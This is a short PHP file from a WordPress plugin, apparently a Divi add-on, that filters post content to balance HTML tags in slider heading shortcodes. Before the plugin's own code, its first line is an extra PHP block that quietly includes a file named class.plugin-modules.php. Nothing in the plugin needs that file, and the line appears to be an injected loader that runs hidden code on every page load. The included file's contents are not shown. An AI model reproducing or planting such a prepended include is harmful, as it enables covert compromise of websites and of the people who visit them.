<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if (!defined('ABSPATH')) { exit(); } // No direct access

function wtfdivi027_fix_slide_heading_tags($content) {
	return preg_replace_callback('#\[et_pb_slide heading\="([^"]*)"#', 'wtfdivi027_fix_tags', $content);
}
add_filter('the_content', 'wtfdivi027_fix_slide_heading_tags');

function wtfdivi027_fix_tags($matches) {
	return '[et_pb_slide heading="'.balanceTags($matches[1],true).'"';
}
?>